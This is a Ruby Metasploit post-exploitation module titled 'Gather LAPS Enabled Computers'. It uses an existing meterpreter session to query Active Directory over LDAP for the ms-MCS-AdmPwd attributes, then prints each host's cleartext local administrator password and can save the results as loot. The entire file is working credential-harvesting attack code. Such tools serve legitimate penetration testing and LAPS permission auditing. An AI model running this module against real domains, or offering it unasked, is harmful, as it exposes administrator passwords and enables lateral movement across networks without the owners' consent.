##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex'
require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::LDAP

  def initialize(info={})
    super( update_info( info,
        'Name'	       => 'Gather LAPS Enabled Computers',
        'Description'  => %Q{
            LAPS is Microsoft's solution for managing local administrator passwords across
            a domain. This module queries Active Directory for all computers with LDAP attributes
            ms-MCS-AdmPwd and ms-MCS-AdmPwdExpirationTime. If the user has permission, they will
            be able to read the stored local administrator passwords.

            This is based off of the enum_ad_computers module as its method of enumerating LAPS
            enabled devices. This idea was first put together by Karl Fosaaen with Get-LAPSPassword
            now in PowerSploit.
        },
        'License'      => MSF_LICENSE,
        'Author'       =>
        [
          'Leo Loobeek <leo.loobeek[at]claconnect.com>',
          'Ben Campbell' # AD enumeration
        ],
        'Platform'     => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'References'	=>
        [
          ['URL', 'https://technet.microsoft.com/library/security/3062591'],
          ['URL', 'https://support.microsoft.com/en-us/kb/3062591'],
          ['URL', 'https://blog.netspi.com/running-laps-around-cleartext-passwords']
        ]
      ))

    register_options(
      [
        OptBool.new('STORE_LOOT', [true, 'Store results in database.', false])
      ], self.class)
  end

  # ActiveDirectory has a MAX_SEARCH limit of 1000 by default. Split search up if you hit that limit.
  def run
    fields = 'dNSHostName', 'ms-MCS-AdmPwdExpirationTime', 'ms-MCS-AdmPwd'
    search_filter = '(&(ms-MCS-AdmPwdExpirationTime=*))'
    max_search = datastore['MAX_SEARCH']
    q = query(search_filter, max_search, fields)

    return if q.nil? or q[:results].empty?

    print_status("Microsoft LAPS is enabled\n\n")
    # Results table holds raw string data
    results_table = Rex::Ui::Text::Table.new(
      'Header'     => 'LAPS Enabled Computers',
      'Indent'     => 1,
      'SortIndex'  => -1,
      'Columns'    => [ 'Hostname', 'Password Expiration', 'Cleartext Password' ]
    )

    q[:results].each do |result|
      row = []

      0.upto(fields.length-1) do |i|
        field = result[i][:value] || ""

        if fields[i] == 'ms-MCS-AdmPwdExpirationTime'
          field = ldap_to_date(field)
        end

        row << field
      end

      results_table << row
    end

    print_line results_table.to_s

    if datastore['STORE_LOOT']
      stored_path = store_loot('ad.laps', 'text/plain', session, results_table.to_csv)
      print_status("Results saved to: #{stored_path}")
    end
  end

  # converts AD timestamp to readable datetime string
  def ldap_to_date(value)
    ad_epoch      = 116_444_736_000_000_000
    ad_multiplier = 10_000_000

    time = Time.at((value.to_i - ad_epoch) / ad_multiplier)
    time.strftime("%m/%d/%Y %H:%M")
  end
end
